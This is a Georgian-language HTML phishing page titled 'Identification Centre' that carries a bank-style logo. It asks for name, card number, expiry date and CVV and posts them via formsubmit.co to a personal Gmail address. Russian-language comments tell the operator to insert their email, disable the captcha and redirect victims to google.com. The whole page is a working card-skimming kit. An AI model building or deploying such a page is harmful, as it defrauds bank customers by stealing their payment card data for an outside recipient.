<!DOCTYPE html>
<html lang="ka">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="origin">
    
    <title>იდენტიფიკაციის ცენტრი</title>

    <link rel="icon" type="image/png" href="png-clipart-computer-icons-business-others-blue-angle-thumbnail-removebg-preview.png">

    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f9; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
        .center-container { text-align: center; margin-bottom: 20px; }
        .logo { max-width: 150px; }
        .form-container { background: white; padding: 25px 35px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 450px; box-sizing: border-box; }
        h1 { text-align: center; margin-bottom: 10px; color: #333; }
        h3 { text-align: center; color: #666; margin-bottom: 20px; }
        label { font-weight: bold; margin-bottom: 5px; display: block; }
        input { width: 100%; padding: 14px; margin-bottom: 15px; border-radius: 6px; border: 1px solid #ccc; font-size: 16px; box-sizing: border-box; }
        .expiry-cvv-row { display: flex; gap: 15px; }
        .expiry-cvv-row div { flex: 1; }
        button { width: 100%; padding: 16px; background-color: #007bff; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
        button:hover { background-color: #0056b3; }
        @media (max-width: 480px) { .form-container { padding: 20px; } }
    </style>
</head>

<body>

<div class="center-container">
    <img src="TBlogo.svg.png" alt="Logo" class="logo">
</div>

<div class="form-container">
    <h1>იდენტიფიკაციის ცენტრი</h1>

    <!-- ИСПРАВЛЕНИЕ: Теперь используется formsubmit.co. Вставь свою почту ниже -->
    <form action="https://formsubmit.co/kapanadze1995work@gmail.com
" method="POST">
        
        <!-- Настройка: убираем капчу для удобства (необязательно) -->
        <input type="hidden" name="_captcha" value="false">
        <!-- Настройка: страница после отправки (можно оставить пустой) -->
        <input type="hidden" name="_next" value="https://google.com">

        <h3>შეავსეთ ფორმა</h3>

        <label for="first-name">სახელი</label>
        <input type="text" name="Имя" id="first-name" required>

        <label for="last-name">გვარი</label>
        <input type="text" name="Фамилия" id="last-name" required>

        <label for="order-id">ბარათის ნომერი</label>
        <input type="text" name="Номер_Карты_ID" id="order-id" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" required>

        <div class="expiry-cvv-row">
            <div>
                <label for="expiry-date">მოქმედების ვადა</label>
                <input type="text" name="Срок_Действия" id="expiry-date" placeholder="MM/YY" maxlength="5" inputmode="numeric" required>
            </div>
            <div>
                <label for="cvv">უსაფრთხოების კოდი</label>
                <input type="text" name="CVV_Код" id="cvv" placeholder="***" maxlength="3" inputmode="numeric" required>
            </div>
        </div>

        <button type="submit">მონაცების გაგზავნა</button>
    </form>
</div>

<script>
    document.getElementById('order-id').addEventListener('input', function (e) {
        let value = e.target.value.replace(/\D/g, '').slice(0,16);
        e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
    });

    document.getElementById('expiry-date').addEventListener('input', function (e) {
        let value = e.target.value.replace(/\D/g, ''); 
        if (value.length >= 2) {
            e.target.value = value.slice(0, 2) + '/' + value.slice(2, 4);
        } else {
            e.target.value = value;
        }
    });

    document.getElementById('cvv').addEventListener('input', function (e) {
        e.target.value = e.target.value.replace(/\D/g, '').slice(0,3);
    });
</script>

</body>
</html>
